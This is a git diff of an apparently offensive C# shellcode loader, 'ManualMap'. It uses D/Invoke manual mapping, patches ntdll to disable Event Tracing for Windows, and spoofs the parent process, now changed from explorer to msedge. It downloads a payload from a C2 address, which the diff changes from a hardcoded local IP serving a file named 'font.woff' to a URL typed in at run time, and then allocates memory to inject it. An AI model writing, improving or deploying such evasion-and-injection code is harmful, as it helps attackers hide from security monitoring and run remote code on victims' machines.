@@ -11,7 +11,7 @@ using static DInvoke.Data.Win32.WinNT;
 
 // D/Invoke Manual Mapping
 // Native API
-// PPID Spoof
+// PPID Spoofing
 // Process Mitigation Policy (BlockDLLs)
 // Patch ETW
 
@@ -54,8 +54,8 @@ namespace ManualMap
             IntPtr ProcessHandle,
             ref IntPtr BaseAddress,
             ref IntPtr RegionSize,
-            MemoryProtection NewProtect,
-            out MemoryProtection OldProtect);
+            uint NewProtect,
+            out uint OldProtect);
 
         [UnmanagedFunctionPointer(CallingConvention.StdCall, CharSet = CharSet.Unicode, SetLastError = true)]
         public delegate Data.Native.NTSTATUS NtCreateThreadExDelegate(
@@ -80,9 +80,7 @@ namespace ManualMap
         [DllImport("kernel32.dll", SetLastError = true)]
         public static extern bool UpdateProcThreadAttribute(IntPtr lpAttributeList, uint dwFlags, IntPtr Attribute, IntPtr lpValue, IntPtr cbSize, IntPtr lpPreviousValue, IntPtr lpReturnSize);
 
-        [DllImport("kernel32.dll", SetLastError = true)]
-        public static extern bool DeleteProcThreadAttributeList(IntPtr lpAttributeList);
-
+        
         public static bool p3TW()
         {
             var nt = Map.MapModuleToMemory("C:\\Windows\\System32\\ntdll.dll");
@@ -95,8 +93,8 @@ namespace ManualMap
                 (IntPtr)(-1),
                 addr,
                 (IntPtr)patch.Length,
-                MemoryProtection.ExecuteReadWrite,
-                new MemoryProtection()
+                (uint)MemoryProtection.ExecuteReadWrite,
+                new uint()
             };
 
             var res = Generic.CallMappedDLLModuleExport<Data.Native.NTSTATUS>(
@@ -109,6 +107,7 @@ namespace ManualMap
 
             if (res != Data.Native.NTSTATUS.Success)
             {
+                Map.FreeModule(nt);
                 return false;
             }
 
@@ -119,8 +118,8 @@ namespace ManualMap
                 (IntPtr)(-1),
                 addr,
                 (IntPtr)patch.Length,
-                (MemoryProtection)paramNPVM[4],
-                new MemoryProtection()
+                (uint)paramNPVM[4],
+                new uint()
             };
 
             res = Generic.CallMappedDLLModuleExport<Data.Native.NTSTATUS>(
@@ -133,6 +132,7 @@ namespace ManualMap
 
             if (res != Data.Native.NTSTATUS.Success)
             {
+                Map.FreeModule(nt);
                 return false;
             }
 
@@ -149,7 +149,6 @@ namespace ManualMap
                 return;
             }
             Console.WriteLine("[>] Event Tracing for Windows Patched");
-
 
             // map dll
             var nt = Map.MapModuleToMemory("C:\\Windows\\System32\\ntdll.dll");
@@ -187,7 +186,7 @@ namespace ManualMap
                 IntPtr.Zero
                 );
 
-            var parentHandle = Process.GetProcessesByName("explorer")[0].Handle;
+            var parentHandle = Process.GetProcessesByName("msedge")[0].Handle;
             lpValue = Marshal.AllocHGlobal(IntPtr.Size);
             Marshal.WriteIntPtr(lpValue, parentHandle);
 
@@ -245,7 +244,9 @@ namespace ManualMap
                 // set allowed tls versions
                 ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12 | SecurityProtocolType.Tls13;
 
-                sh = client.DownloadData("http://192.168.56.102:80/font.woff");
+                Console.Write("[>] URL: ");
+                string c2 = Console.ReadLine();
+                sh = client.DownloadData(c2);
             };
 
             // NtAllocateVirtualMemory
